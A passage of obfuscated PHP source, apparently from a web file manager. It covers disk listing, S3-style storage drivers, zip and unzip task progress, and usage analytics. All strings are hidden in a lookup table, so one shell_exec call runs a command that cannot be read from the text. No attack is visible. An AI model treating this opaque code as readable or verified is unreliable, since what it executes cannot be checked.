$„ÎÔâ½‘; } } $„ÎÔâ½‘ = self::diskListGet(); Cache::set($ê†Ê††, $„ÎÔâ½‘, 60); return $„ÎÔâ½‘; } public static function diskListGet() { $¯úÈüñï =& $_SERVER[Î‹ÃÂŞ„]; $é—Ê»ôÉ = array(); if ($GLOBALS[$¯úÈüñï[6]][$¯úÈüñï[1354]] == $¯úÈüñï[1355]) { $œÙ”ÄÏŠ = $¯úÈüñï[1356]; for ($äêÌˆ¢½ = 0; $äêÌˆ¢½ < strlen($œÙ”ÄÏŠ); $äêÌˆ¢½++) { $ìçşÊÀã = $œÙ”ÄÏŠ[$äêÌˆ¢½] . $¯úÈüñï[1357]; if (file_exists($ìçşÊÀã)) { $é—Ê»ôÉ[] = $ìçşÊÀã; } } return $é—Ê»ôÉ; } if (!function_exists($¯úÈüñï[100])) { $é—Ê»ôÉ[] = $¯úÈüñï[883]; return $é—Ê»ôÉ; } $Ë°¾Ö®ß = explode($¯úÈüñï[248], shell_exec($¯úÈüñï[1358])); array_shift($Ë°¾Ö®ß); array_pop($Ë°¾Ö®ß); $ƒöÅ³ÒØ = array($¯úÈüñï[1359], $¯úÈüñï[1360], $¯úÈüñï[1361], $¯úÈüñï[1362], $¯úÈüñï[1363], $¯úÈüñï[1364], $¯úÈüñï[1365], $¯úÈüñï[1366]); foreach ($Ë°¾Ö®ß as $²¯ÉîÄ) { $êŞø ™İ = preg_split($¯úÈüñï[1367], $²¯ÉîÄ); $ìçşÊÀã = $êŞø ™İ[count($êŞø ™İ) - 1]; if (!strstr($êŞø ™İ[0], $¯úÈüñï[1368]) || !$ìçşÊÀã) { continue; } $Ø‹Í¦çÕ = rtrim($ìçşÊÀã, $¯úÈüñï[8]) . $¯úÈüñï[8]; if (in_array($Ø‹Í¦çÕ, $ƒöÅ³ÒØ)) { continue; } $é—Ê»ôÉ[] = $Ø‹Í¦çÕ; } return $é—Ê»ôÉ; } public static function isSameDisk($ËÏ÷¡, $ïˆÁòËË) { $½¿ñæ±ï =& $_SERVER[Î‹ÃÂŞ„]; if ($GLOBALS[$½¿ñæ±ï[6]][$½¿ñæ±ï[1354]] == $½¿ñæ±ï[1355]) { return strtolower(substr($ËÏ÷¡, 0, 1)) == strtolower(substr($ïˆÁòËË, 0, 1)); } $ÕïÎ³Ëç = self::diskList(); $êÁ¾Õ™Ú = !1; $Ö¨Ï¥Ù = !1; sort($ÕïÎ³Ëç); $ÕïÎ³Ëç = array_reverse($ÕïÎ³Ëç); $ËÏ÷¡ = rtrim($ËÏ÷¡, $½¿ñæ±ï[8]) . $½¿ñæ±ï[8]; $ïˆÁòËË = rtrim($ïˆÁòËË, $½¿ñæ±ï[8]) . $½¿ñæ±ï[8]; foreach ($ÕïÎ³Ëç as $›çæ²—) { $îª¨êÂÓ = strlen($›çæ²—); if (!$êÁ¾Õ™Ú && substr($ËÏ÷¡, 0, $îª¨êÂÓ) == $›çæ²—) { $êÁ¾Õ™Ú = $›çæ²—; } if (!$Ö¨Ï¥Ù && substr($ïˆÁòËË, 0, $îª¨êÂÓ) == $›çæ²—) { $Ö¨Ï¥Ù = $›çæ²—; } if ($êÁ¾Õ™Ú && $Ö¨Ï¥Ù) { break; } } return $êÁ¾Õ™Ú === $Ö¨Ï¥Ù; } public static function transferType($éÏÄİ—, $ğ±šµÖ) { $¨Á¾Æšğ =& $_SERVER[Î‹ÃÂŞ„]; $£¦‘¢å· = self::driverType($éÏÄİ—); $úÇùÌÒ = self::driverType($ğ±šµÖ); if ($£¦‘¢å·[$¨Á¾Æšğ[33]] == $úÇùÌÒ[$¨Á¾Æšğ[33]] && $£¦‘¢å·[$¨Á¾Æšğ[1369]] == $úÇùÌÒ[$¨Á¾Æšğ[1369]]) { return $¨Á¾Æšğ[1370]; } if ($£¦‘¢å·[$¨Á¾Æšğ[33]] == $¨Á¾Æšğ[916] && $úÇùÌÒ[$¨Á¾Æšğ[33]] == $¨Á¾Æšğ[108]) { return $¨Á¾Æšğ[1249]; } if ($£¦‘¢å·[$¨Á¾Æšğ[33]] == $¨Á¾Æšğ[108] && $úÇùÌÒ[$¨Á¾Æšğ[33]] == $¨Á¾Æšğ[916]) { return $¨Á¾Æšğ[109]; } return $¨Á¾Æšğ[1371]; } public static function driverType($¢ÜííŞ¿) { $œ‹İË™ =& $_SERVER[Î‹ÃÂŞ„]; $¹Ÿõ†Ùó = str_replace($œ‹İË™[1372], $œ‹İË™[12], strtolower($¢ÜííŞ¿->getType())); if ($¹Ÿõ†Ùó == $œ‹İË™[804] || $¹Ÿõ†Ùó == $œ‹İË™[1373] || $¹Ÿõ†Ùó == $œ‹İË™[1374]) { $¢ÜííŞ¿ = self::defaultDriverInit(); } else { if ($¹Ÿõ†Ùó == $œ‹İË™[1259] || $¹Ÿõ†Ùó == $œ‹İË™[1375]) { $¢ÜííŞ¿ = IO::init($¢ÜííŞ¿->pathParse[$œ‹İË™[1206]]); } } $Ï•°Ô‘ = $¢ÜííŞ¿->path; $¹Ÿõ†Ùó = str_replace($œ‹İË™[1372], $œ‹İË™[12], strtolower($¢ÜííŞ¿->getType())); if ($¹Ÿõ†Ùó == $œ‹İË™[108]) { return array($œ‹İË™[33] => $œ‹İË™[108], $œ‹İË™[1369] => $œ‹İË™[12], $œ‹İË™[86] => $Ï•°Ô‘, $œ‹İË™[97] => $¢ÜííŞ¿); } return array($œ‹İË™[33] => $œ‹İË™[916], $œ‹İË™[1369] => $¢ÜííŞ¿->pathDriver, $œ‹İË™[86] => $Ï•°Ô‘, $œ‹İË™[97] => $¢ÜííŞ¿); } public static function pathDriverType($Ñƒš†êí) { return $Ñƒš†êí ? self::driverType(IO::init($Ñƒš†êí)) : !1; } public static function pathDriverLocal($Šëâî¶) { $‘Ô–›ÁÅ =& $_SERVER[Î‹ÃÂŞ„]; $½ó¸İöä = $Šëâî¶ ? self::driverType(IO::init($Šëâî¶)) : !1; return $½ó¸İöä[$‘Ô–›ÁÅ[33]] == $‘Ô–›ÁÅ[108] ? !0 : !1; } public static function allowCover($ÃüçÖ¡…, $±Î™¨ = true) { $¾­€×‡° =& $_SERVER[Î‹ÃÂŞ„]; if (is_string($ÃüçÖ¡…)) { $ÃüçÖ¡… = IO::info($ÃüçÖ¡…); } if (!$ÃüçÖ¡… || $ÃüçÖ¡…[$¾­€×‡°[33]] == $¾­€×‡°[77] || $ÃüçÖ¡…[$¾­€×‡°[78]] <= 100) { return !1; } if (isset($ÃüçÖ¡…[$¾­€×‡°[1376]]) || !$ÃüçÖ¡…[$¾­€×‡°[86]]) { return !1; } if (isset($ÃüçÖ¡…[$¾­€×‡°[218]]) && !$ÃüçÖ¡…[$¾­€×‡°[218]]) { return !1; } static $Í¹«Ğ¿ = false; if (!$Í¹«Ğ¿ || !$±Î™¨) { $ÆŒØï˜  = self::driverType(IO::init($ÃüçÖ¡…[$¾­€×‡°[86]])); $ØÓ°…ˆ• = $ÆŒØï˜ [$¾­€×‡°[97]]; $Í¹«Ğ¿ = $¾­€×‡°[186]; if ($ÆŒØï˜ [$¾­€×‡°[33]] == $¾­€×‡°[108]) { $Í¹«Ğ¿ = $¾­€×‡°[1377]; } if ($ÆŒØï˜ [$¾­€×‡°[97]] && is_array($ÆŒØï˜ [$¾­€×‡°[97]]->config)) { $‘ï¥ºá¡ = $ÆŒØï˜ [$¾­€×‡°[97]]->config; if (isset($‘ï¥ºá¡[$¾­€×‡°[1378]]) && $‘ï¥ºá¡[$¾­€×‡°[1378]]) { $Í¹«Ğ¿ = $¾­€×‡°[1377]; } } } return $Í¹«Ğ¿ == $¾­€×‡°[1377] ? !0 : !1; } } class PathDriverBOS extends PathDriverBaseS3 { public function __construct($õÒÁâò) { parent::__construct($õÒÁâò); } public function getHost() { $™ı™ûšâ =& $_SERVER[Î‹ÃÂŞ„]; $Â‡…´Å¶ = str_rtrim(parent::getHost(), $™ı™ûšâ[8] . $this->bucket); $Â‡…´Å¶ = explode($™ı™ûšâ[200], $Â‡…´Å¶); return $Â‡…´Å¶[0] . $™ı™ûšâ[200] . $this->bucket . $™ı™ûšâ[1379] . $Â‡…´Å¶[1]; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($—Ô“…ŒÛ) { parent::__construct($—Ô“…ŒÛ); $this->signatureVersion($_SERVER[Î‹ÃÂŞ„][233]); } public function uploadFormData($–å†¼Ö, $§ë²¼Ç£ = 3600) { $§ñü®…Ó =& $_SERVER[Î‹ÃÂŞ„]; $€’†¾äú = $§ñü®…Ó[215]; $ÂÆ½Ê¹É = $§ñü®…Ó[249]; $Ô«Úîİä = $§ñü®…Ó[259]; $ÑÁÅŞ¼Ú = gmdate($§ñü®…Ó[1380], time() + $§ë²¼Ç£); $ÕêıäŞë = (string) time() . $§ñü®…Ó[73] . (string) (time() + $§ë²¼Ç£); $–ì¬£ğÎ = array($§ñü®…Ó[260] => $ÑÁÅŞ¼Ú, $§ñü®…Ó[263] => array(array($§ñü®…Ó[265] => $€’†¾äú), array($§ñü®…Ó[264] => $this->bucket), array($§ñü®…Ó[266], $§ñü®…Ó[267], $§ñü®…Ó[12]), array($§ñü®…Ó[270] => $Ô«Úîİä), array($§ñü®…Ó[1381] => $ÂÆ½Ê¹É), array($§ñü®…Ó[1382] => $this->accessKey), array($§ñü®…Ó[1383] => $ÕêıäŞë))); $–ì¬£ğÎ = json_encode($–ì¬£ğÎ); $‡œ‹ãà± = hash_hmac($§ñü®…Ó[249], $ÕêıäŞë, $this->secret); $£å¶ŞüÏ = sha1($–ì¬£ğÎ); $ƒÏò¦‡ = hash_hmac($§ñü®…Ó[249], $£å¶ŞüÏ, $‡œ‹ãà±); $º“¼ÇŠ¶ = array($§ñü®…Ó[265] => $€’†¾äú, $§ñü®…Ó[270] => $Ô«Úîİä, $§ñü®…Ó[278] => base64_encode($–ì¬£ğÎ), $§ñü®…Ó[1381] => $ÂÆ½Ê¹É, $§ñü®…Ó[1382] => $this->accessKey, $§ñü®…Ó[1384] => $ÕêıäŞë, $§ñü®…Ó[1385] => $ƒÏò¦‡, $§ñü®…Ó[198] => $this->getHost()); return $º“¼ÇŠ¶; } public function fileOutLink($øş¥¯©ä) { $‡íöïãê =& $_SERVER[Î‹ÃÂŞ„]; if (substr($øş¥¯©ä, 0, 7) == $‡íöïãê[1386]) { $øş¥¯©ä = $‡íöïãê[1387] . substr($øş¥¯©ä, 7); } header($‡íöïãê[164] . $øş¥¯©ä); die; } } goto BÃ¸æË‡ˆÀ; D‚‡ÄÊ™ˆ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $Ëıƒ¸ü¾ =& $_SERVER[Î‹ÃÂŞ„]; parent::startAfter(); Hook::bind($Ëıƒ¸ü¾[1817], array($this, $Ëıƒ¸ü¾[1818])); Hook::bind($Ëıƒ¸ü¾[1248], array($this, $Ëıƒ¸ü¾[1819])); Hook::bind($Ëıƒ¸ü¾[1820], array($this, $Ëıƒ¸ü¾[1821])); $×‡˜Å€ó =& $this->task; $×‡˜Å€ó[$Ëıƒ¸ü¾[1822]] = $Ëıƒ¸ü¾[1249]; if (!$×‡˜Å€ó[$Ëıƒ¸ü¾[1600]]) { $×‡˜Å€ó[$Ëıƒ¸ü¾[1600]] = LNG($Ëıƒ¸ü¾[1823]); } } protected function endAfter() { $‹ğçÕÓ¸ =& $_SERVER[Î‹ÃÂŞ„]; parent::endAfter(); Hook::unbind($‹ğçÕÓ¸[1817], array($this, $‹ğçÕÓ¸[1818])); Hook::unbind($‹ğçÕÓ¸[1248], array($this, $‹ğçÕÓ¸[1819])); Hook::unbind($‹ğçÕÓ¸[1820], array($this, $‹ğçÕÓ¸[1821])); } public function updateAfter() { $Á––ïº =& $_SERVER[Î‹ÃÂŞ„]; $‚¸êÇĞ‘ =& $this->task; if (!$‚¸êÇĞ‘[$Á––ïº[833]] || !$‚¸êÇĞ‘[$Á––ïº[810]]) { if ($‚¸êÇĞ‘[$Á––ïº[1822]] != $Á––ïº[359]) { return; } } if ($‚¸êÇĞ‘[$Á––ïº[1822]] == $Á––ïº[1249]) { $¿»ÌÓöÚ = 0; if ($‚¸êÇĞ‘[$Á––ïº[1757]]) { $¿»ÌÓöÚ = $‚¸êÇĞ‘[$Á––ïº[1758]] / $‚¸êÇĞ‘[$Á––ïº[1757]]; } $‚¸êÇĞ‘[$Á––ïº[1706]] = $¿»ÌÓöÚ * 0.3; } else { if ($‚¸êÇĞ‘[$Á––ïº[1822]] == $Á––ïº[359]) { $¿»ÌÓöÚ = $‚¸êÇĞ‘[$Á––ïº[1705]] / $‚¸êÇĞ‘[$Á––ïº[833]]; $‚¸êÇĞ‘[$Á––ïº[1706]] = 0.3 + $¿»ÌÓöÚ * 0.4; } else { if ($‚¸êÇĞ‘[$Á––ïº[1822]] == $Á––ïº[109]) { $ü¿¡Îàİ = 0; if ($‚¸êÇĞ‘[$Á––ïº[1759]] == $Á––ïº[109]) { $ü¿¡Îàİ = $‚¸êÇĞ‘[$Á––ïº[1758]]; } $¿»ÌÓöÚ = ($‚¸êÇĞ‘[$Á––ïº[1762]] + $ü¿¡Îàİ) / $‚¸êÇĞ‘[$Á––ïº[810]]; $‚¸êÇĞ‘[$Á––ïº[1706]] = 0.3 + 0.4 + $¿»ÌÓöÚ * 0.3; } } } if ($‚¸êÇĞ‘[$Á––ïº[1706]] > 0) { $Êûúøƒ = timeFloat() - $‚¸êÇĞ‘[$Á––ïº[1708]] - $‚¸êÇĞ‘[$Á––ïº[1711]]; $‚¸êÇĞ‘[$Á––ïº[1712]] = $Êûúøƒ * (1 - $‚¸êÇĞ‘[$Á––ïº[1706]]) / $‚¸êÇĞ‘[$Á––ïº[1706]]; } } public function addFile($†Î»”û) { $òâµŸ¡ =& $_SERVER[Î‹ÃÂŞ„]; $ÅĞ‹ÚÇÒ =& $this->task; $Ç„‚Óã¿ = IO::info($†Î»”û); $ÅĞ‹ÚÇÒ[$òâµŸ¡[1755]] = $Ç„‚Óã¿[$òâµŸ¡[32]]; $ÅĞ‹ÚÇÒ[$òâµŸ¡[1757]] = $Ç„‚Óã¿[$òâµŸ¡[78]]; $ÅĞ‹ÚÇÒ[$òâµŸ¡[1758]] = 0; $ÅĞ‹ÚÇÒ[$òâµŸ¡[1119]] = $òâµŸ¡[1778]; $ÅĞ‹ÚÇÒ[$òâµŸ¡[1759]] = $òâµŸ¡[1249]; $ÅĞ‹ÚÇÒ[$òâµŸ¡[810]] = $Ç„‚Óã¿[$òâµŸ¡[78]]; $ÅĞ‹ÚÇÒ[$òâµŸ¡[833]] = 1; $¤°ï»Ğ = 0; $ÅĞ‹ÚÇÒ[$òâµŸ¡[1766]] = array($òâµŸ¡[1767] => $¤°ï»Ğ + 1, $òâµŸ¡[464] => $Ç„‚Óã¿[$òâµŸ¡[32]], $òâµŸ¡[86] => $Ç„‚Óã¿[$òâµŸ¡[86]], $òâµŸ¡[554] => $Ç„‚Óã¿[$òâµŸ¡[554]] ? $Ç„‚Óã¿[$òâµŸ¡[554]] : $Ç„‚Óã¿[$òâµŸ¡[86]]); $this->update(); } public function zipEvent($î¥¥¤ŞÖ, $òüËæùÆ, $òÜô¥Á, $ë„”—óˆ) { $…±â¶İê =& $_SERVER[Î‹ÃÂŞ„]; $Ôƒ‡½ş =& $this->task; $Ôƒ‡½ş[$…±â¶İê[1755]] = get_path_this($òüËæùÆ); $Ôƒ‡½ş[$…±â¶İê[1757]] = $ë„”—óˆ; $Ôƒ‡½ş[$…±â¶İê[1758]] = $òÜô¥Á; $Ôƒ‡½ş[$…±â¶İê[1119]] = $î¥¥¤ŞÖ == $…±â¶İê[1824] ? $…±â¶İê[1825] : $…±â¶İê[1826]; $Ôƒ‡½ş[$…±â¶İê[1759]] = $…±â¶İê[12]; $Ôƒ‡½ş[$…±â¶İê[810]] = $ë„”—óˆ; $Ôƒ‡½ş[$…±â¶İê[1822]] = $…±â¶İê[359]; $this->update(); } public function unzipAfter($ËÖ‘æ·ã) { $œÜŞ¿é =& $_SERVER[Î‹ÃÂŞ„]; $Ğ¯ÅÇÀÁ =& $this->task; $Ğ¯ÅÇÀÁ[$œÜŞ¿é[1822]] = $œÜŞ¿é[109]; $ï¢şÛ—„ = IO::infoWithChildren($ËÖ‘æ·ã); $Å¾ßéÇİ = 0; $Ğ¯ÅÇÀÁ[$œÜŞ¿é[1766]] = array($œÜŞ¿é[1767] => $Å¾ßéÇİ + 1, $œÜŞ¿é[464] => $ï¢şÛ—„[$œÜŞ¿é[32]], $œÜŞ¿é[86] => $ï¢şÛ—„[$œÜŞ¿é[86]], $œÜŞ¿é[554] => $ï¢şÛ—„[$œÜŞ¿é[554]] ? $ï¢şÛ—„[$œÜŞ¿é[554]] : $ï¢şÛ—„[$œÜŞ¿é[86]]); if ($ï¢şÛ—„[$œÜŞ¿é[33]] == $œÜŞ¿é[216]) { $Ğ¯ÅÇÀÁ[$œÜŞ¿é[833]] = 1; } else { $Ğ¯ÅÇÀÁ[$œÜŞ¿é[833]] = $ï¢şÛ—„[$œÜŞ¿é[81]][$œÜŞ¿é[79]]; } $Ğ¯ÅÇÀÁ[$œÜŞ¿é[1119]] = $œÜŞ¿é[12]; $Ğ¯ÅÇÀÁ[$œÜŞ¿é[1759]] = 0; $Ğ¯ÅÇÀÁ[$œÜŞ¿é[1705]] = 0; $Ğ¯ÅÇÀÁ[$œÜŞ¿é[1757]] = 0; $Ğ¯ÅÇÀÁ[$œÜŞ¿é[1758]] = 0; $Ğ¯ÅÇÀÁ[$œÜŞ¿é[1755]] = $œÜŞ¿é[12]; $Ğ¯ÅÇÀÁ[$œÜŞ¿é[1762]] = 0; $Ğ¯ÅÇÀÁ[$œÜŞ¿é[810]] = $ï¢şÛ—„[$œÜŞ¿é[78]]; $this->update(); self::log($œÜŞ¿é[1827] . json_encode(array($Ğ¯ÅÇÀÁ, $ï¢şÛ—„))); } public function nameParse($Óí—ìĞ) { $ü¯¶Ä¶Á =& $_SERVER[Î‹ÃÂŞ„]; $¢ˆ¿µ =& $this->task; if ($¢ˆ¿µ[$ü¯¶Ä¶Á[1822]] == $ü¯¶Ä¶Á[1249]) { $¢ˆ¿µ[$ü¯¶Ä¶Á[1822]] = $ü¯¶Ä¶Á[359]; $¢ˆ¿µ[$ü¯¶Ä¶Á[1762]] = 0; $¢ˆ¿µ[$ü¯¶Ä¶Á[810]] = 0; } $ß¶÷¢¥Ä = get_path_this($Óí—ìĞ); if (strstr($ß¶÷¢¥Ä, $ü¯¶Ä¶Á[10])) { $¢ˆ¿µ[$ü¯¶Ä¶Á[1705]] += 1; $¢ˆ¿µ[$ü¯¶Ä¶Á[833]] += 1; } $¢ˆ¿µ[$ü¯¶Ä¶Á[1755]] = $Óí—ìĞ; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $°™èîêÃ =& $_SERVER[Î‹ÃÂŞ„]; parent::startAfter(); Hook::bind($°™èîêÃ[1828], array($this, $°™èîêÃ[1818])); Hook::bind($°™èîêÃ[1820], array($this, $°™èîêÃ[1821])); $¤Šî¢ç =& $this->task; $¤Šî¢ç[$°™èîêÃ[1822]] = $°™èîêÃ[1249]; if (!$¤Šî¢ç[$°™èîêÃ[1600]]) { $¤Šî¢ç[$°™èîêÃ[1600]] = LNG($°™èîêÃ[1829]); } } protected function endAfter() { $õº©Ø¯Ş =& $_SERVER[Î‹ÃÂŞ„]; parent::endAfter(); Hook::unbind($õº©Ø¯Ş[1828], array($this, $õº©Ø¯Ş[1818])); Hook::unbind($õº©Ø¯Ş[1820], array($this, $õº©Ø¯Ş[1821])); } public function updateAfter() { $ÓÔ¡šİº =& $_SERVER[Î‹ÃÂŞ„]; $‚•Ì±¢ =& $this->task; if (!$‚•Ì±¢[$ÓÔ¡šİº[833]] || !$‚•Ì±¢[$ÓÔ¡šİº[810]]) { return; } if ($‚•Ì±¢[$ÓÔ¡šİº[1822]] == $ÓÔ¡šİº[1249]) { $»ûŸå‚ = $‚•Ì±¢[$ÓÔ¡šİº[1758]]; if ($‚•Ì±¢[$ÓÔ¡šİº[1759]] != $ÓÔ¡šİº[1249]) { $»ûŸå‚ = 0; } $°´À§ıÔ = ($‚•Ì±¢[$ÓÔ¡šİº[1762]] + $»ûŸå‚) / $‚•Ì±¢[$ÓÔ¡šİº[810]]; $‚•Ì±¢[$ÓÔ¡šİº[1706]] = $°´À§ıÔ * 0.3; } else { if ($‚•Ì±¢[$ÓÔ¡šİº[1822]] == $ÓÔ¡šİº[359]) { $°´À§ıÔ = $‚•Ì±¢[$ÓÔ¡šİº[1705]] / $‚•Ì±¢[$ÓÔ¡šİº[833]]; $‚•Ì±¢[$ÓÔ¡šİº[1706]] = 0.3 + $°´À§ıÔ * 0.5; } else { if ($‚•Ì±¢[$ÓÔ¡šİº[1822]] == $ÓÔ¡šİº[109]) { $°´À§ıÔ = 0; if ($‚•Ì±¢[$ÓÔ¡šİº[1757]]) { $°´À§ıÔ = $‚•Ì±¢[$ÓÔ¡šİº[1758]] / $‚•Ì±¢[$ÓÔ¡šİº[1757]]; } $‚•Ì±¢[$ÓÔ¡šİº[1706]] = 0.3 + 0.5 + $°´À§ıÔ * 0.2; } } } if ($‚•Ì±¢[$ÓÔ¡šİº[1706]] > 0) { $Şòş¤Òè = timeFloat() - $‚•Ì±¢[$ÓÔ¡šİº[1708]] - $‚•Ì±¢[$ÓÔ¡šİº[1711]]; $‚•Ì±¢[$ÓÔ¡šİº[1712]] = $Şòş¤Òè * (1 - $‚•Ì±¢[$ÓÔ¡šİº[1706]]) / $‚•Ì±¢[$ÓÔ¡šİº[1706]]; } } public function copyFileStart($ö¥İşá‹, $·˜¹€ø–, $áÙ›ÖØ², $È¸‹…•û, $Ö¯Â¸Ó¬, $»ÒµÁÄµ) { $³÷ÌÒÁ =& $_SERVER[Î‹ÃÂŞ„]; parent::copyFileStart($ö¥İşá‹, $·˜¹€ø–, $áÙ›ÖØ², $È¸‹…•û, $Ö¯Â¸Ó¬, $»ÒµÁÄµ); $¶±¢°ª° =& $this->task; if ($¶±¢°ª°[$³÷ÌÒÁ[1822]] == $³÷ÌÒÁ[359]) { $¶±¢°ª°[$³÷ÌÒÁ[1822]] = $³÷ÌÒÁ[109]; } $this->update(); } public function copyFileEnd($Š¤ğÚô, $…²²ÄâÀ, $Ñ˜Ô¨ìï, $×‘äˆÖñ, $š¹ûŞ, $˜èàñ’) { $•çòÉÂ =& $_SERVER[Î‹ÃÂŞ„]; $ä¤ÔÚÉ =& $this->task; $ä¤ÔÚÉ[$•çòÉÂ[1758]] = $ä¤ÔÚÉ[$•çòÉÂ[1757]]; $ä¤ÔÚÉ[$•çòÉÂ[1762]] += $ä¤ÔÚÉ[$•çòÉÂ[1757]]; $ä¤ÔÚÉ[$•çòÉÂ[1759]] = $•çòÉÂ[12]; $this->update(); } public function zipEvent($ŸÜÒÔ ®, $ûäÂë, $ï´©¤ª‚, $«—–æì²) { $îÙ¯†Î§ =& $_SERVER[Î‹ÃÂŞ„]; $™½§÷ñò =& $this->task; $™½§÷ñò[$îÙ¯†Î§[1755]] = get_path_this($ûäÂë); $™½§÷ñò[$îÙ¯†Î§[1757]] = $«—–æì²; $™½§÷ñò[$îÙ¯†Î§[1758]] = $ï´©¤ª‚; $™½§÷ñò[$îÙ¯†Î§[1119]] = $ŸÜÒÔ ® == $îÙ¯†Î§[1830] ? $îÙ¯†Î§[1825] : $îÙ¯†Î§[1826]; $™½§÷ñò[$îÙ¯†Î§[1759]] = $îÙ¯†Î§[12]; $™½§÷ñò[$îÙ¯†Î§[810]] = $«—–æì²; $™½§÷ñò[$îÙ¯†Î§[1822]] = $îÙ¯†Î§[359]; $this->update(); } public function nameParse($Èğºªâ£) { $†«š÷ú  =& $_SERVER[Î‹ÃÂŞ„]; $ËˆÒüá• =& $this->task; if ($ËˆÒüá•[$†«š÷ú [1705]] < $ËˆÒüá•[$†«š÷ú [833]]) { $¥µ¼Í‚– = get_path_this($Èğºªâ£); if (strstr($¥µ¼Í‚–, $†«š÷ú [10])) { $ËˆÒüá•[$†«š÷ú [1705]] += 1; } } if ($ËˆÒüá•[$†«š÷ú [1822]] == $†«š÷ú [1249]) { $ËˆÒüá•[$†«š÷ú [1822]] = $†«š÷ú [359]; } $ËˆÒüá•[$†«š÷ú [1755]] = $Èğºªâ£; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($ÁƒçÊ¬ã) { $’ªîÍòÅ =& $_SERVER[Î‹ÃÂŞ„]; $Öí²ƒÔµ = array($’ªîÍòÅ[633] => array($’ªîÍòÅ[33] => $’ªîÍòÅ[1831], $’ªîÍòÅ[319] => array($’ªîÍòÅ[241], $’ªîÍòÅ[812], $’ªîÍòÅ[1832], $’ªîÍòÅ[1833])), $’ªîÍòÅ[1834] => array($’ªîÍòÅ[33] => $’ªîÍòÅ[1835], $’ªîÍòÅ[319] => array($’ªîÍòÅ[241], $’ªîÍòÅ[810], $’ªîÍòÅ[1836], $’ªîÍòÅ[1837], $’ªîÍòÅ[1838]))); if (!isset($Öí²ƒÔµ[$ÁƒçÊ¬ã])) { return !1; } $this->optionType = $Öí²ƒÔµ[$ÁƒçÊ¬ã][$’ªîÍòÅ[33]]; $this->field = $Öí²ƒÔµ[$ÁƒçÊ¬ã][$’ªîÍòÅ[319]]; return !0; } public function listData($•ÌÒŒÑŒ = false, $ïÉî¯¥ = "\x6d\x6f\144\151\146\x79\x54\x69\x6d\x65", $á‹º¤§³ = false) { return parent::listData($•ÌÒŒÑŒ, $ïÉî¯¥, $á‹º¤§³); } public function trendList($€†ÃŒè’) { $œ¶Ùô› =& $_SERVER[Î‹ÃÂŞ„]; $öñÅüä = $this->listData(); if ($öñÅüä) { $¡ŠœË½ = end($öñÅüä); $×Ö”ëñ‚ = date($œ¶Ùô›[1839], strtotime($œ¶Ùô›[1840])); if ($¡ŠœË½[$œ¶Ùô›[241]] == $×Ö”ëñ‚) { return $öñÅüä; } $öüÂúå· = strtotime($¡ŠœË½[$œ¶Ùô›[241]]); } if (!isset($öüÂúå·)) { $ºŒøÑ”î = $€†ÃŒè’ == $œ¶Ùô›[633] ? $œ¶Ùô›[570] : $œ¶Ùô›[872]; $öüÂúå· = Model($ºŒøÑ”î)->min($œ¶Ùô›[217]); } $†ÉÑ½©ø = $œ¶Ùô›[1841] . ucfirst($€†ÃŒè’); $×Ç°§ªí = $this->dateList($öüÂúå·); foreach ($×Ç°§ªí as $×Ö”ëñ‚) { $this->{$†ÉÑ½©ø}($×Ö”ëñ‚); } return $this->listData(); } private function dateList($±ûîŞ‘à) { $ãŞ…ªËğ =& $_SERVER[Î‹ÃÂŞ„]; $áÆ³šéš = $±ûîŞ‘à; $²Ú–¸›Å = strtotime($ãŞ…ªËğ[1840]); $¹Ş‰Å = array(); while ($áÆ³šéš <= $²Ú–¸›Å) { $¹Ş‰Å[] = date($ãŞ…ªËğ[1839], $áÆ³šéš); $áÆ³šéš = strtotime($ãŞ…ªËğ[1842], $áÆ³šéš); } return $¹Ş‰Å; } public function _recordUser($Ì¢˜Ôãº = '') { $•˜úĞÕë =& $_SERVER[Î‹ÃÂŞ„]; $œó­·ı = strtotime(date($•˜úĞÕë[1843], strtotime($Ì¢˜Ôãº))); $ÛÔ©áœ = strtotime(date($•˜úĞÕë[1844], strtotime($Ì¢˜Ôãº))); $ßÒË»’Ï = array($•˜úĞÕë[217] => array($•˜úĞÕë[1068], $ÛÔ©áœ)); $ˆ©ùìéó = Model($•˜úĞÕë[570])->where($ßÒË»’Ï)->count($•˜úĞÕë[1704]); $ßÒË»’Ï[$•˜úĞÕë[217]] = array($•˜úĞÕë[379], array($œó­·ı, $ÛÔ©áœ)); $›ùœƒ¢× = Model($•˜úĞÕë[570])->where($ßÒË»’Ï)->count($•˜úĞÕë[1704]); $ßÒË»’Ï[$•˜úĞÕë[33]] = $•˜úĞÕë[1845]; $€ÑÜ·å“ = Model($•˜úĞÕë[1846])->where($ßÒË»’Ï)->count($•˜úĞÕë[1847]); $‹¬’™ğ¯ = array($•˜úĞÕë[241] => $Ì¢˜Ôãº, $•˜úĞÕë[812] => (int) $ˆ©ùìéó, $•˜úĞÕë[1832] => (int) $›ùœƒ¢×, $•˜úĞÕë[1833] => (int) $€ÑÜ·å“); return $this->insert($‹¬’™ğ¯); } public function _recordStore($…ª¤• = '') { $ŠŒ®µâ =& $_SERVER[Î‹ÃÂŞ„]; $ÆŞŸ›Ïá = strtotime(date($ŠŒ®µâ[1844], strtotime($…ª¤•))); $˜è÷´Ã¤ = array($ŠŒ®µâ[217] => array($ŠŒ®µâ[1068], $ÆŞŸ›Ïá)); $öİÎóÏ = Model($ŠŒ®µâ[514])->where($˜è÷´Ã¤)->sum($ŠŒ®µâ[78]); $˜è÷´Ã¤[$ŠŒ®µâ[455]] = 0; $–÷Ã½¶â = Model($ŠŒ®µâ[872])->where($˜è÷´Ã¤)->sum($ŠŒ®µâ[78]); $˜è÷´Ã¤[$ŠŒ®µâ[180]] = 1; $ˆëæÁó = Model($ŠŒ®µâ[872])->where($˜è÷´Ã¤)->sum($ŠŒ®µâ[78]); $˜è÷´Ã¤[$ŠŒ®µâ[180]] = 2; $À¼º’•ü = Model($ŠŒ®µâ[872])->where($˜è÷´Ã¤)->sum($ŠŒ®µâ[78]); $¾ùÌÑë¦ = array($ŠŒ®µâ[241] => $…ª¤•, $ŠŒ®µâ[810] => (int) $–÷Ã½¶â, $ŠŒ®µâ[1836] => (int) $öİÎóÏ, $ŠŒ®µâ[1837] => (int) $ˆëæÁó, $ŠŒ®µâ[1838] => (int) $À¼º’•ü); return $this->insert($¾ùÌÑë¦); } public function trend($Úğòöâš, $¥ƒ×·) { $®Ä˜ºë€ =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->init($Úğòöâš)) { return !1; } 